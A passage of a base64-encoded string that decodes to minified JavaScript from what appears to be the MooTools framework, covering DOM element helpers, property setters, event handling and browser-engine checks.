dpbmRvdz0kLmRvY3VtZW50PSRhcmd1bWVudHMoMCk7Ck5hdGl2ZS5pbXBsZW1lbnQoW0VsZW1lbnQsRG9jdW1lbnRdLHtnZXRFbGVtZW50OmZ1bmN0aW9uKGEsYil7cmV0dXJuICQodGhpcy5nZXRFbGVtZW50cyhhLHRydWUpWzBdfHxudWxsLGIpO30sZ2V0RWxlbWVudHM6ZnVuY3Rpb24oYSxkKXthPWEuc3BsaXQoIiwiKTsKdmFyIGM9W107dmFyIGI9KGEubGVuZ3RoPjEpO2EuZWFjaChmdW5jdGlvbihlKXt2YXIgZj10aGlzLmdldEVsZW1lbnRzQnlUYWdOYW1lKGUudHJpbSgpKTsoYik/Yy5leHRlbmQoZik6Yz1mO30sdGhpcyk7cmV0dXJuIG5ldyBFbGVtZW50cyhjLHtkZHVwOmIsY2FzaDohZH0pOwp9fSk7KGZ1bmN0aW9uKCl7dmFyIGg9e30sZj17fTt2YXIgaT17aW5wdXQ6ImNoZWNrZWQiLG9wdGlvbjoic2VsZWN0ZWQiLHRleHRhcmVhOihCcm93c2VyLkVuZ2luZS53ZWJraXQmJkJyb3dzZXIuRW5naW5lLnZlcnNpb248NDIwKT8iaW5uZXJIVE1MIjoidmFsdWUifTsKdmFyIGM9ZnVuY3Rpb24obCl7cmV0dXJuKGZbbF18fChmW2xdPXt9KSk7fTt2YXIgZz1mdW5jdGlvbihuLGwpe2lmKCFuKXtyZXR1cm47fXZhciBtPW4udWlkO2lmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpe2lmKG4uY2xlYXJBdHRyaWJ1dGVzKXt2YXIgcT1sJiZuLmNsb25lTm9kZShmYWxzZSk7Cm4uY2xlYXJBdHRyaWJ1dGVzKCk7aWYocSl7bi5tZXJnZUF0dHJpYnV0ZXMocSk7fX1lbHNle2lmKG4ucmVtb3ZlRXZlbnRzKXtuLnJlbW92ZUV2ZW50cygpO319aWYoKC9vYmplY3QvaSkudGVzdChuLnRhZ05hbWUpKXtmb3IodmFyIG8gaW4gbil7aWYodHlwZW9mIG5bb109PSJmdW5jdGlvbiIpe25bb109JGVtcHR5Owp9fUVsZW1lbnQuZGlzcG9zZShuKTt9fWlmKCFtKXtyZXR1cm47fWhbbV09ZlttXT1udWxsO307dmFyIGQ9ZnVuY3Rpb24oKXtIYXNoLmVhY2goaCxnKTtpZihCcm93c2VyLkVuZ2luZS50cmlkZW50KXskQShkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgib2JqZWN0IikpLmVhY2goZyk7Cn1pZih3aW5kb3cuQ29sbGVjdEdhcmJhZ2Upe0NvbGxlY3RHYXJiYWdlKCk7fWg9Zj1udWxsO307dmFyIGo9ZnVuY3Rpb24obixsLHMsbSxwLHIpe3ZhciBvPW5bc3x8bF07dmFyIHE9W107d2hpbGUobyl7aWYoby5ub2RlVHlwZT09MSYmKCFtfHxFbGVtZW50Lm1hdGNoKG8sbSkpKXtpZighcCl7cmV0dXJuICQobyxyKTsKfXEucHVzaChvKTt9bz1vW2xdO31yZXR1cm4ocCk/bmV3IEVsZW1lbnRzKHEse2RkdXA6ZmFsc2UsY2FzaDohcn0pOm51bGw7fTt2YXIgZT17aHRtbDoiaW5uZXJIVE1MIiwiY2xhc3MiOiJjbGFzc05hbWUiLCJmb3IiOiJodG1sRm9yIix0ZXh0OihCcm93c2VyLkVuZ2luZS50cmlkZW50fHwoQnJvd3Nlci5FbmdpbmUud2Via2l0JiZCcm93c2VyLkVuZ2luZS52ZXJzaW9uPDQyMCkpPyJpbm5lclRleHQiOiJ0ZXh0Q29udGVudCJ9Owp2YXIgYj1bImNvbXBhY3QiLCJub3dyYXAiLCJpc21hcCIsImRlY2xhcmUiLCJub3NoYWRlIiwiY2hlY2tlZCIsImRpc2FibGVkIiwicmVhZG9ubHkiLCJtdWx0aXBsZSIsInNlbGVjdGVkIiwibm9yZXNpemUiLCJkZWZlciJdO3ZhciBrPVsidmFsdWUiLCJhY2Nlc3NLZXkiLCJjZWxsUGFkZGluZyIsImNlbGxTcGFjaW5nIiwiY29sU3BhbiIsImZyYW1lQm9yZGVyIiwibWF4TGVuZ3RoIiwicmVhZE9ubHkiLCJyb3dTcGFuIiwidGFiSW5kZXgiLCJ1c2VNYXAiXTsKYj1iLmFzc29jaWF0ZShiKTtIYXNoLmV4dGVuZChlLGIpO0hhc2guZXh0ZW5kKGUsay5hc3NvY2lhdGUoay5tYXAoU3RyaW5nLnRvTG93ZXJDYXNlKSkpO3ZhciBhPXtiZWZvcmU6ZnVuY3Rpb24obSxsKXtpZihsLnBhcmVudE5vZGUpe2wucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUobSxsKTsKfX0sYWZ0ZXI6ZnVuY3Rpb24obSxsKXtpZighbC5wYXJlbnROb2RlKXtyZXR1cm47fXZhciBuPWwubmV4dFNpYmxpbmc7KG4pP2wucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUobSxuKTpsLnBhcmVudE5vZGUuYXBwZW5kQ2hpbGQobSk7fSxib3R0b206ZnVuY3Rpb24obSxsKXtsLmFwcGVuZENoaWxkKG0pOwp9LHRvcDpmdW5jdGlvbihtLGwpe3ZhciBuPWwuZmlyc3RDaGlsZDsobik/bC5pbnNlcnRCZWZvcmUobSxuKTpsLmFwcGVuZENoaWxkKG0pO319O2EuaW5zaWRlPWEuYm90dG9tO0hhc2guZWFjaChhLGZ1bmN0aW9uKGwsbSl7bT1tLmNhcGl0YWxpemUoKTtFbGVtZW50LmltcGxlbWVudCgiaW5qZWN0IittLGZ1bmN0aW9uKG4pe2wodGhpcywkKG4sdHJ1ZSkpOwpyZXR1cm4gdGhpczt9KTtFbGVtZW50LmltcGxlbWVudCgiZ3JhYiIrbSxmdW5jdGlvbihuKXtsKCQobix0cnVlKSx0aGlzKTtyZXR1cm4gdGhpczt9KTt9KTtFbGVtZW50LmltcGxlbWVudCh7c2V0OmZ1bmN0aW9uKG8sbSl7c3dpdGNoKCR0eXBlKG8pKXtjYXNlIm9iamVjdCI6Zm9yKHZhciBuIGluIG8pe3RoaXMuc2V0KG4sb1tuXSk7Cn1icmVhaztjYXNlInN0cmluZyI6dmFyIGw9RWxlbWVudC5Qcm9wZXJ0aWVzLmdldChvKTsobCYmbC5zZXQpP2wuc2V0LmFwcGx5KHRoaXMsQXJyYXkuc2xpY2UoYXJndW1lbnRzLDEpKTp0aGlzLnNldFByb3BlcnR5KG8sbSk7fXJldHVybiB0aGlzO30sZ2V0OmZ1bmN0aW9uKG0pe3ZhciBsPUVsZW1lbnQuUHJvcGVydGllcy5nZXQobSk7CnJldHVybihsJiZsLmdldCk/bC5nZXQuYXBwbHkodGhpcyxBcnJheS5zbGljZShhcmd1bWVudHMsMSkpOnRoaXMuZ2V0UHJvcGVydHkobSk7fSxlcmFzZTpmdW5jdGlvbihtKXt2YXIgbD1FbGVtZW50LlByb3BlcnRpZXMuZ2V0KG0pOyhsJiZsLmVyYXNlKT9sLmVyYXNlLmFwcGx5KHRoaXMpOnRoaXMucmVtb3ZlUHJvcGVydHkobSk7CnJldHVybiB0aGlzO30sc2V0UHJvcGVydHk6ZnVuY3Rpb24obSxuKXt2YXIgbD1lW21dO2lmKG49PXVuZGVmaW5lZCl7cmV0dXJuIHRoaXMucmVtb3ZlUHJvcGVydHkobSk7fWlmKGwmJmJbbV0pe249ISFuO30obCk/dGhpc1tsXT1uOnRoaXMuc2V0QXR0cmlidXRlKG0sIiIrbik7CnJldHVybiB0aGlzO30sc2V0UHJvcGVydGllczpmdW5jdGlvbihsKXtmb3IodmFyIG0gaW4gbCl7dGhpcy5zZXRQcm9wZXJ0eShtLGxbbV0pO31yZXR1cm4gdGhpczt9LGdldFByb3BlcnR5OmZ1bmN0aW9uKG0pe3ZhciBsPWVbbV07dmFyIG49KGwpP3RoaXNbbF06dGhpcy5nZXRBdHRyaWJ1dGUobSwyKTsKcmV0dXJuKGJbbV0pPyEhbjoobCk/bjpufHxudWxsO30sZ2V0UHJvcGVydGllczpmdW5jdGlvbigpe3ZhciBsPSRBKGFyZ3VtZW50cyk7cmV0dXJuIGwubWFwKHRoaXMuZ2V0UHJvcGVydHksdGhpcykuYXNzb2NpYXRlKGwpO30scmVtb3ZlUHJvcGVydHk6ZnVuY3Rpb24obSl7dmFyIGw9ZVttXTsKKGwpP3RoaXNbbF09KGwmJmJbbV0pP2ZhbHNlOiIiOnRoaXMucmVtb3ZlQXR0cmlidXRlKG0pO3JldHVybiB0aGlzO30scmVtb3ZlUHJvcGVydGllczpmdW5jdGlvbigpe0FycmF5LmVhY2goYXJndW1lbnRzLHRoaXMucmVtb3ZlUHJvcGVydHksdGhpcyk7cmV0dXJuIHRoaXM7Cn0saGFzQ2xhc3M6ZnVuY3Rpb24obCl7cmV0dXJuIHRoaXMuY2xhc3NOYW1lLmNvbnRhaW5zKGwsIiAiKTt9LGFkZENsYXNzOmZ1bmN0aW9uKGwpe2lmKCF0aGlzLmhhc0NsYXNzKGwpKXt0aGlzLmNsYXNzTmFtZT0odGhpcy5jbGFzc05hbWUrIiAiK2wpLmNsZWFuKCk7Cn1yZXR1cm4gdGhpczt9LHJlbW92ZUNsYXNzOmZ1bmN0aW9uKGwpe3RoaXMuY2xhc3NOYW1lPXRoaXMuY2xhc3NOYW1lLnJlcGxhY2UobmV3IFJlZ0V4cCgiKF58XFxzKSIrbCsiKD86XFxzfCQpIiksIiQxIik7cmV0dXJuIHRoaXM7fSx0b2dnbGVDbGFzczpmdW5jdGlvbihsKXtyZXR1cm4gdGhpcy5oYXNDbGFzcyhsKT90aGlzLnJlbW92ZUNsYXNzKGwpOnRoaXMuYWRkQ2xhc3MobCk7Cn0sYWRvcHQ6ZnVuY3Rpb24oKXtBcnJheS5mbGF0dGVuKGFyZ3VtZW50cykuZWFjaChmdW5jdGlvbihsKXtsPSQobCx0cnVlKTtpZihsKXt0aGlzLmFwcGVuZENoaWxkKGwpO319LHRoaXMpO3JldHVybiB0aGlzO30sYXBwZW5kVGV4dDpmdW5jdGlvbihtLGwpe3JldHVybiB0aGlzLmdyYWIodGhpcy5nZXREb2N1bWVudCgpLm5ld1RleHROb2RlKG0pLGwpOwp9LGdyYWI6ZnVuY3Rpb24obSxsKXthW2x8fCJib3R0b20iXSgkKG0sdHJ1ZSksdGhpcyk7cmV0dXJuIHRoaXM7fSxpbmplY3Q6ZnVuY3Rpb24obSxsKXthW2x8fCJib3R0b20iXSh0aGlzLCQobSx0cnVlKSk7cmV0dXJuIHRoaXM7fSxyZXBsYWNlczpmdW5jdGlvbihsKXtsPSQobCx0cnVlKTsKbC5wYXJlbnROb2RlLnJlcGxhY2VDaGlsZCh0aGlzLGwpO3JldHVybiB0aGlzO30sd3JhcHM6ZnVuY3Rpb24obSxsKXttPSQobSx0cnVlKTtyZXR1cm4gdGhpcy5yZXBsYWNlcyhtKS5ncmFiKG0sbCk7fSxnZXRQcmV2aW91czpmdW5jdGlvbihsLG0pe3JldHVybiBqKHRoaXMsInByZXZpb3VzU2libGluZyIsbnVsbCxsLGZhbHNlLG0pOwp9LGdldEFsbFByZXZpb3VzOmZ1bmN0aW9uKGwsbSl7cmV0dXJuIGoodGhpcywicHJldmlvdXNTaWJsaW5nIixudWxsLGwsdHJ1ZSxtKTt9LGdldE5leHQ6ZnVuY3Rpb24obCxtKXtyZXR1cm4gaih0aGlzLCJuZXh0U2libGluZyIsbnVsbCxsLGZhbHNlLG0pO30sZ2V0QWxsTmV4dDpmdW5jdGlvbihsLG0pe3JldHVybiBqKHRoaXMsIm5leHRTaWJsaW5nIixudWxsLGwsdHJ1ZSxtKTsKfSxnZXRGaXJzdDpmdW5jdGlvbihsLG0pe3JldHVybiBqKHRoaXMsIm5leHRTaWJsaW5nIiwiZmlyc3RDaGlsZCIsbCxmYWxzZSxtKTt9LGdldExhc3Q6ZnVuY3Rpb24obCxtKXtyZXR1cm4gaih0aGlzLCJwcmV2aW91c1NpYmxpbmciLCJsYXN0Q2hpbGQiLGwsZmFsc2UsbSk7Cn0sZ2V0UGFyZW50OmZ1bmN0aW9uKGwsbSl7cmV0dXJuIGoodGhpcywicGFyZW50Tm9kZSIsbnVsbCxsLGZhbHNlLG0pO30sZ2V0UGFyZW50czpmdW5jdGlvbihsLG0pe3JldHVybiBqKHRoaXMsInBhcmVudE5vZGUiLG51bGwsbCx0cnVlLG0pO30sZ2V0U2libGluZ3M6ZnVuY3Rpb24obCxtKXtyZXR1cm4gdGhpcy5nZXRQYXJlbnQoKS5nZXRDaGlsZHJlbihsLG0pLmVyYXNlKHRoaXMpOwp9LGdldENoaWxkcmVuOmZ1bmN0aW9uKGwsbSl7cmV0dXJuIGoodGhpcywibmV4dFNpYmxpbmciLCJmaXJzdENoaWxkIixsLHRydWUsbSk7fSxnZXRXaW5kb3c6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5vd25lckRvY3VtZW50LndpbmRvdzt9LGdldERvY3VtZW50OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMub3duZXJEb2N1bWVudDsKfSxnZXRFbGVtZW50QnlJZDpmdW5jdGlvbihvLG4pe3ZhciBtPXRoaXMub3duZXJEb2N1bWVudC5nZXRFbGVtZW50QnlJZChvKTtpZighbSl7cmV0dXJuIG51bGw7fWZvcih2YXIgbD1tLnBhcmVudE5vZGU7bCE9dGhpcztsPWwucGFyZW50Tm9kZSl7aWYoIWwpe3JldHVybiBudWxsOwp9fXJldHVybiAkLmVsZW1lbnQobSxuKTt9LGdldFNlbGVjdGVkOmZ1bmN0aW9uKCl7cmV0dXJuIG5ldyBFbGVtZW50cygkQSh0aGlzLm9wdGlvbnMpLmZpbHRlcihmdW5jdGlvbihsKXtyZXR1cm4gbC5zZWxlY3RlZDt9KSk7fSxnZXRDb21wdXRlZFN0eWxlOmZ1bmN0aW9uKG0pe2lmKHRoaXMuY3VycmVudFN0eWxlKXtyZXR1cm4gdGhpcy5jdXJyZW50U3R5bGVbbS5jYW1lbENhc2UoKV07Cn12YXIgbD10aGlzLmdldERvY3VtZW50KCkuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSh0aGlzLG51bGwpO3JldHVybihsKT9sLmdldFByb3BlcnR5VmFsdWUoW20uaHlwaGVuYXRlKCldKTpudWxsO30sdG9RdWVyeVN0cmluZzpmdW5jdGlvbigpe3ZhciBsPVtdOwp0aGlzLmdldEVsZW1lbnRzKCJpbnB1dCwgc2VsZWN0LCB0ZXh0YXJlYSIsdHJ1ZSkuZWFjaChmdW5jdGlvbihtKXtpZighbS5uYW1lfHxtLmRpc2FibGVkKXtyZXR1cm47fXZhciBuPShtLnRhZ05hbWUudG9Mb3dlckNhc2UoKT09InNlbGVjdCIpP0VsZW1lbnQuZ2V0U2VsZWN0ZWQobSkubWFwKGZ1bmN0aW9uKG8pe3JldHVybiBvLnZhbHVlOwp9KTooKG0udHlwZT09InJhZGlvInx8bS50eXBlPT0iY2hlY2tib3giKSYmIW0uY2hlY2tlZCk/bnVsbDptLnZhbHVlOyRzcGxhdChuKS5lYWNoKGZ1bmN0aW9uKG8pe2lmKHR5cGVvZiBvIT0idW5kZWZpbmVkIil7bC5wdXNoKG0ubmFtZSsiPSIrZW5jb2RlVVJJQ29tcG9uZW50KG8pKTsKfX0pO30pO3JldHVybiBsLmpvaW4oIiYiKTt9LGNsb25lOmZ1bmN0aW9uKG8sbCl7bz1vIT09ZmFsc2U7dmFyIHI9dGhpcy5jbG9uZU5vZGUobyk7dmFyIG49ZnVuY3Rpb24odix1KXtpZighbCl7di5yZW1vdmVBdHRyaWJ1dGUoImlkIik7fWlmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpe3YuY2xlYXJBdHRyaWJ1dGVzKCk7CnYubWVyZ2VBdHRyaWJ1dGVzKHUpO3YucmVtb3ZlQXR0cmlidXRlKCJ1aWQiKTtpZih2Lm9wdGlvbnMpe3ZhciB3PXYub3B0aW9ucyxzPXUub3B0aW9ucztmb3IodmFyIHQ9dy5sZW5ndGg7dC0tOyl7d1t0XS5zZWxlY3RlZD1zW3RdLnNlbGVjdGVkO319fXZhciB4PWlbdS50YWdOYW1lLnRvTG93ZXJDYXNlKCldOwppZih4JiZ1W3hdKXt2W3hdPXVbeF07fX07aWYobyl7dmFyIHA9ci5nZXRFbGVtZW50c0J5VGFnTmFtZSgiKiIpLHE9dGhpcy5nZXRFbGVtZW50c0J5VGFnTmFtZSgiKiIpO2Zvcih2YXIgbT1wLmxlbmd0aDttLS07KXtuKHBbbV0scVttXSk7fX1uKHIsdGhpcyk7cmV0dXJuICQocik7Cn0sZGVzdHJveTpmdW5jdGlvbigpe0VsZW1lbnQuZW1wdHkodGhpcyk7RWxlbWVudC5kaXNwb3NlKHRoaXMpO2codGhpcyx0cnVlKTtyZXR1cm4gbnVsbDt9LGVtcHR5OmZ1bmN0aW9uKCl7JEEodGhpcy5jaGlsZE5vZGVzKS5lYWNoKGZ1bmN0aW9uKGwpe0VsZW1lbnQuZGVzdHJveShsKTsKfSk7cmV0dXJuIHRoaXM7fSxkaXNwb3NlOmZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMucGFyZW50Tm9kZSk/dGhpcy5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHRoaXMpOnRoaXM7fSxoYXNDaGlsZDpmdW5jdGlvbihsKXtsPSQobCx0cnVlKTtpZighbCl7cmV0dXJuIGZhbHNlOwp9aWYoQnJvd3Nlci5FbmdpbmUud2Via2l0JiZCcm93c2VyLkVuZ2luZS52ZXJzaW9uPDQyMCl7cmV0dXJuICRBKHRoaXMuZ2V0RWxlbWVudHNCeVRhZ05hbWUobC50YWdOYW1lKSkuY29udGFpbnMobCk7fXJldHVybih0aGlzLmNvbnRhaW5zKT8odGhpcyE9bCYmdGhpcy5jb250YWlucyhsKSk6ISEodGhpcy5jb21wYXJlRG9jdW1lbnRQb3NpdGlvbihsKSYxNik7Cn0sbWF0Y2g6ZnVuY3Rpb24obCl7cmV0dXJuKCFsfHwobD09dGhpcyl8fChFbGVtZW50LmdldCh0aGlzLCJ0YWciKT09bCkpO319KTtOYXRpdmUuaW1wbGVtZW50KFtFbGVtZW50LFdpbmRvdyxEb2N1bWVudF0se2FkZExpc3RlbmVyOmZ1bmN0aW9uKG8sbil7aWYobz09InVubG9hZCIpe3ZhciBsPW4sbT10aGlzOwpuPWZ1bmN0aW9uKCl7bS5yZW1vdmVMaXN0ZW5lcigidW5sb2FkIixuKTtsKCk7fTt9ZWxzZXtoW3RoaXMudWlkXT10aGlzO31pZih0aGlzLmFkZEV2ZW50TGlzdGVuZXIpe3RoaXMuYWRkRXZlbnRMaXN0ZW5lcihvLG4sZmFsc2UpO31lbHNle3RoaXMuYXR0YWNoRXZlbnQoIm9uIitvLG4pOwp9cmV0dXJuIHRoaXM7fSxyZW1vdmVMaXN0ZW5lcjpmdW5jdGlvbihtLGwpe2lmKHRoaXMucmVtb3ZlRXZlbnRMaXN0ZW5lcil7dGhpcy5yZW1vdmVFdmVudExpc3RlbmVyKG0sbCxmYWxzZSk7fWVsc2V7dGhpcy5kZXRhY2hFdmVudCgib24iK20sbCk7fXJldHVybiB0aGlzOwp9LHJldHJpZXZlOmZ1bmN0aW9uKG0sbCl7dmFyIG89Yyh0aGlzLnVpZCksbj1vW21dO2lmKGwhPXVuZGVmaW5lZCYmbj09dW5kZWZpbmVkKXtuPW9bbV09bDt9cmV0dXJuICRwaWNrKG4pO30sc3RvcmU6ZnVuY3Rpb24obSxsKXt2YXIgbj1jKHRoaXMudWlkKTtuW21dPWw7CnJldHVybiB0aGlzO30sZWxpbWluYXRlOmZ1bmN0aW9uKGwpe3ZhciBtPWModGhpcy51aWQpO2RlbGV0ZSBtW2xdO3JldHVybiB0aGlzO319KTt3aW5kb3cuYWRkTGlzdGVuZXIoInVubG9hZCIsZCk7fSkoKTtFbGVtZW50LlByb3BlcnRpZXM9bmV3IEhhc2g7RWxlbWVudC5Qcm9wZXJ0aWVzLnN0eWxlPXtzZXQ6ZnVuY3Rpb24oYSl7dGhpcy5zdHlsZS5jc3NUZXh0PWE7Cn0sZ2V0OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuc3R5bGUuY3NzVGV4dDt9LGVyYXNlOmZ1bmN0aW9uKCl7dGhpcy5zdHlsZS5jc3NUZXh0PSIiO319O0VsZW1lbnQuUHJvcGVydGllcy50YWc9e2dldDpmdW5jdGlvbigpe3JldHVybiB0aGlzLnRhZ05hbWUudG9Mb3dlckNhc2UoKTsKfX07RWxlbWVudC5Qcm9wZXJ0aWVzLmh0bWw9KGZ1bmN0aW9uKCl7dmFyIGM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7dmFyIGE9e3RhYmxlOlsxLCI8dGFibGU+IiwiPC90YWJsZT4iXSxzZWxlY3Q6WzEsIjxzZWxlY3Q+IiwiPC9zZWxlY3Q+Il0sdGJvZHk6WzIsIjx0YWJsZT48dGJvZHk+IiwiPC90Ym9keT48L3RhYmxlPiJdLHRyOlszLCI8dGFibGU+PHRib2R5Pjx0cj4iLCI8L3RyPjwvdGJvZHk+PC90YWJsZT4iXX07CmEudGhlYWQ9YS50Zm9vdD1hLnRib2R5O3ZhciBiPXtzZXQ6ZnVuY3Rpb24oKXt2YXIgZT1BcnJheS5mbGF0dGVuKGFyZ3VtZW50cykuam9pbigiIik7dmFyIGY9QnJvd3Nlci5FbmdpbmUudHJpZGVudCYmYVt0aGlzLmdldCgidGFnIildO2lmKGYpe3ZhciBnPWM7Zy5pbm5lckhUTUw9ZlsxXStlK2ZbMl07CmZvcih2YXIgZD1mWzBdO2QtLTspe2c9Zy5maXJzdENoaWxkO310aGlzLmVtcHR5KCkuYWRvcHQoZy5jaGlsZE5vZGVzKTt9ZWxzZXt0aGlzLmlubmVySFRNTD1lO319fTtiLmVyYXNlPWIuc2V0O3JldHVybiBiO30pKCk7aWYoQnJvd3Nlci5FbmdpbmUud2Via2l0JiZCcm93c2VyLkVuZ2luZS52ZXJzaW9uPDQyMCl7RWxlbWVudC5Qcm9wZXJ0aWVzLnRleHQ9e2dldDpmdW5jdGlvbigpe2lmKHRoaXMuaW5uZXJUZXh0KXtyZXR1cm4gdGhpcy5pbm5lclRleHQ7Cn12YXIgYT10aGlzLm93bmVyRG9jdW1lbnQubmV3RWxlbWVudCgiZGl2Iix7aHRtbDp0aGlzLmlubmVySFRNTH0pLmluamVjdCh0aGlzLm93bmVyRG9jdW1lbnQuYm9keSk7dmFyIGI9YS5pbm5lclRleHQ7YS5kZXN0cm95KCk7cmV0dXJuIGI7fX07fUVsZW1lbnQuUHJvcGVydGllcy5ldmVudHM9e3NldDpmdW5jdGlvbihhKXt0aGlzLmFkZEV2ZW50cyhhKTsKfX07TmF0aXZlLmltcGxlbWVudChbRWxlbWVudCxXaW5kb3csRG9jdW1lbnRdLHthZGRFdmVudDpmdW5jdGlvbihlLGcpe3ZhciBoPXRoaXMucmV0cmlldmUoImV2ZW50cyIse30pO2hbZV09aFtlXXx8e2tleXM6W10sdmFsdWVzOltdfTtpZihoW2VdLmtleXMuY29udGFpbnMoZykpe3JldHVybiB0aGlzOwp9aFtlXS5rZXlzLnB1c2goZyk7dmFyIGY9ZSxhPUVsZW1lbnQuRXZlbnRzLmdldChlKSxjPWcsaT10aGlzO2lmKGEpe2lmKGEub25BZGQpe2Eub25BZGQuY2FsbCh0aGlzLGcpO31pZihhLmNvbmRpdGlvbil7Yz1mdW5jdGlvbihqKXtpZihhLmNvbmRpdGlvbi5jYWxsKHRoaXMsaikpe3JldHVybiBnLmNhbGwodGhpcyxqKTsKfXJldHVybiB0cnVlO307fWY9YS5iYXNlfHxmO312YXIgZD1mdW5jdGlvbigpe3JldHVybiBnLmNhbGwoaSk7fTt2YXIgYj1FbGVtZW50Lk5hdGl2ZUV2ZW50c1tmXTtpZihiKXtpZihiPT0yKXtkPWZ1bmN0aW9uKGope2o9bmV3IEV2ZW50KGosaS5nZXRXaW5kb3coKSk7CmlmKGMuY2FsbChpLGopPT09ZmFsc2Upe2ouc3RvcCgpO319O310aGlzLmFkZExpc3RlbmVyKGYsZCk7fWhbZV0udmFsdWVzLnB1c2goZCk7cmV0dXJuIHRoaXM7fSxyZW1vdmVFdmVudDpmdW5jdGlvbihjLGIpe3ZhciBhPXRoaXMucmV0cmlldmUoImV2ZW50cyIpO2lmKCFhfHwhYVtjXSl7cmV0dXJuIHRoaXM7Cn12YXIgZj1hW2NdLmtleXMuaW5kZXhPZihiKTtpZihmPT0tMSl7cmV0dXJuIHRoaXM7fWFbY10ua2V5cy5zcGxpY2UoZiwxKTt2YXIgZT1hW2NdLnZhbHVlcy5zcGxpY2UoZiwxKVswXTt2YXIgZD1FbGVtZW50LkV2ZW50cy5nZXQoYyk7aWYoZCl7aWYoZC5vblJlbW92ZSl7ZC5vblJlbW92ZS5jYWxsKHRoaXMsYik7Cn1jPWQuYmFzZXx8Yzt9cmV0dXJuKEVsZW1lbnQuTmF0aXZlRXZlbnRzW2NdKT90aGlzLnJlbW92ZUxpc3RlbmVyKGMsZSk6dGhpczt9LGFkZEV2ZW50czpmdW5jdGlvbihhKXtmb3IodmFyIGIgaW4gYSl7dGhpcy5hZGRFdmVudChiLGFbYl0pO31yZXR1cm4gdGhpczsKfSxyZW1vdmVFdmVudHM6ZnVuY3Rpb24oYSl7dmFyIGM7aWYoJHR5cGUoYSk9PSJvYmplY3QiKXtmb3IoYyBpbiBhKXt0aGlzLnJlbW92ZUV2ZW50KGMsYVtjXSk7fXJldHVybiB0aGlzO312YXIgYj10aGlzLnJldHJpZXZlKCJldmVudHMiKTtpZighYil7cmV0dXJuIHRoaXM7Cn1pZighYSl7Zm9yKGMgaW4gYil7dGhpcy5yZW1vdmVFdmVudHMoYyk7fXRoaXMuZWxpbWluYXRlKCJldmVudHMiKTt9ZWxzZXtpZihiW2FdKXt3aGlsZShiW2FdLmtleXNbMF0pe3RoaXMucmVtb3ZlRXZlbnQoYSxiW2FdLmtleXNbMF0pO31iW2FdPW51bGw7fX1yZXR1cm4gdGhpczsKfSxmaXJlRXZlbnQ6ZnVuY3Rpb24oZCxiLGEpe3ZhciBjPXRoaXMucmV0cmlldmUoImV2ZW50cyIpO2lmKCFjfHwhY1tkXSl7cmV0dXJuIHRoaXM7fWNbZF0ua2V5cy5lYWNoKGZ1bmN0aW9uKGUpe2UuY3JlYXRlKHtiaW5kOnRoaXMsZGVsYXk6YSwiYXJndW1lbnRzIjpifSkoKTsKfSx0aGlzKTtyZXR1cm4gdGhpczt9LGNsb25lRXZlbnRzOmZ1bmN0aW9uKGQsYSl7ZD0kKGQpO3ZhciBjPWQucmV0cmlldmUoImV2ZW50cyIpO2lmKCFjKXtyZXR1cm4gdGhpczt9aWYoIWEpe2Zvcih2YXIgYiBpbiBjKXt0aGlzLmNsb25lRXZlbnRzKGQsYik7fX1lbHNle2lmKGNbYV0pe2NbYV0ua2V5cy5lYWNoKGZ1bmN0aW9uKGUpe3RoaXMuYWRkRXZlbnQoYSxlKTsKfSx0aGlzKTt9fXJldHVybiB0aGlzO319KTtFbGVtZW50Lk5hdGl2ZUV2ZW50cz17Y2xpY2s6MixkYmxjbGljazoyLG1vdXNldXA6Mixtb3VzZWRvd246Mixjb250ZXh0bWVudToyLG1vdXNld2hlZWw6MixET01Nb3VzZVNjcm9sbDoyLG1vdXNlb3ZlcjoyLG1vdXNlb3V0OjIsbW91c2Vtb3ZlOjIsc2VsZWN0c3RhcnQ6MixzZWxlY3RlbmQ6MixrZXlkb3duOjIsa2V5cHJlc3M6MixrZXl1cDoyLGZvY3VzOjIsYmx1cjoyLGNoYW5nZToyLHJlc2V0OjIsc2VsZWN0OjIsc3VibWl0OjIsbG9hZDoxLHVubG9hZDoxLGJlZm9yZXVubG9hZDoyLHJlc2l6ZToxLG1vdmU6MSxET01Db250ZW50TG9hZGVkOjEscmVhZHlzdGF0ZWNoYW5nZToxLGVycm9yOjEsYWJvcnQ6MSxzY3JvbGw6MX07CihmdW5jdGlvbigpe3ZhciBhPWZ1bmN0aW9uKGIpe3ZhciBjPWIucmVsYXRlZFRhcmdldDtpZihjPT11bmRlZmluZWQpe3JldHVybiB0cnVlO31pZihjPT09ZmFsc2Upe3JldHVybiBmYWxzZTt9cmV0dXJuKCR0eXBlKHRoaXMpIT0iZG9jdW1lbnQiJiZjIT10aGlzJiZjLnByZWZpeCE9Inh1bCImJiF0aGlzLmhhc0NoaWxkKGMpKTsKfTtFbGVtZW50LkV2ZW50cz1uZXcgSGFzaCh7bW91c2VlbnRlcjp7YmFzZToibW91c2VvdmVyIixjb25kaXRpb246YX0sbW91c2VsZWF2ZTp7YmFzZToibW91c2VvdXQiLGNvbmRpdGlvbjphfSxtb3VzZXdoZWVsOntiYXNlOihCcm93c2VyLkVuZ2luZS5nZWNrbyk/IkRPTU1vdXNlU2Nyb2xsIjoibW91c2V3aGVlbCJ9fSk7Cn0pKCk7RWxlbWVudC5Qcm9wZXJ0aWVzLnN0eWxlcz17c2V0OmZ1bmN0aW9uKGEpe3RoaXMuc2V0U3R5bGVzKGEpO319O0VsZW1lbnQuUHJvcGVydGllcy5vcGFjaXR5PXtzZXQ6ZnVuY3Rpb24oYSxiKXtpZighYil7aWYoYT09MCl7aWYodGhpcy5zdHlsZS52aXNpYmlsaXR5IT0iaGlkZGVuIil7dGhpcy5zdHlsZS52aXNpYmlsaXR5PSJoaWRkZW4iOwp9fWVsc2V7aWYodGhpcy5zdHlsZS52aXNpYmlsaXR5IT0idmlzaWJsZSIpe3RoaXMuc3R5bGUudmlzaWJpbGl0eT0idmlzaWJsZSI7fX19aWYoIXRoaXMuY3VycmVudFN0eWxlfHwhdGhpcy5